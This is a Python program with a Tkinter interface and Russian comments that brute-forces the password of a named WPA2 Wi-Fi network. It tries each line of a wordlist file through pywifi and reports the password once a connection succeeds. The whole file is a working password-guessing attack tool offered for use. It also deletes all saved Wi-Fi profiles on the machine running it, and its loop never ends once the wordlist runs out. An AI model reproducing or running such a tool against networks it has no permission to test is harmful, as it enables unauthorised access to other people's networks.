from tkinter import *
from pywifi import const
import pywifi
from time import sleep


def wifi_connection(password, wifiname):
    wifi = pywifi.PyWiFi()  # Окно беспроводного объекта
    ifaces = wifi.interfaces()[0]  # Берём первую беспроводную сетевую карту
    ifaces.disconnect()  # Отключаем все Wi-Fi подключения
    sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()  # Создаём подключение Wi-Fi
        profile.ssid = wifiname
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # устанавливаем алгоритм шифрования wifi
        profile.key = password  # передаём пароль к wifi сети
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP  # Устанавливаем модуль шифрования

        ifaces.remove_all_network_profiles()  # Удаляем все сетевые профили Wi-Fi

        temp_profile = ifaces.add_network_profile(profile)  # Устанавливаем новое подключения

        # Подключаемся, ждём 3 секунды и возвращаем результат
        ifaces.connect(temp_profile)
        sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def main():
    wifiname = entry.get().strip()  # Получаем имя сети

    path = r'./wifipwd.txt'
    file = open(path, 'r')
    while True:
        try:
            password = file.readline().strip()  # Читаем файл с паролями

            # Создаём соединение
            connected = wifi_connection(password, wifiname)
            if connected:
                text.insert(END, 'Найден правильный пароль!')
                text.insert(END, password)
                text.see(END)
                text.update()
                file.close()
                break
            else:
                text.insert(END, f'Неправильный пароль {password}')
                text.see(END)
                text.update()
        except Exception:
            continue


# Создаём окно
root = Tk()
root.title('Wi-Fi подбор')
root.geometry('445x370')
root.configure(bg='#111')

# Теги
label = Label(root, text='Введите имя WIFI-сети для подбора:', background="#111", foreground="#fff")
label.grid()

# Контроль ввода
entry = Entry(root, font=('Microsoft Yahei', 14), background="#555", foreground="#fff")
entry.grid(row=0, column=1, pady="6")

# Управление списком
text = Listbox(root, font=('Microsoft Yahei', 14), width=40, height=10, background="#555", foreground="#fff")
text.grid(row=1, columnspan=2, pady="6")

# Кнопка
button = Button(root, text='Начать подбор', width=20, height=2, command=main, background="#555", foreground="#fff")
button.grid(row=2, columnspan=2, pady="6")

# Окно дисплея
root.mainloop()
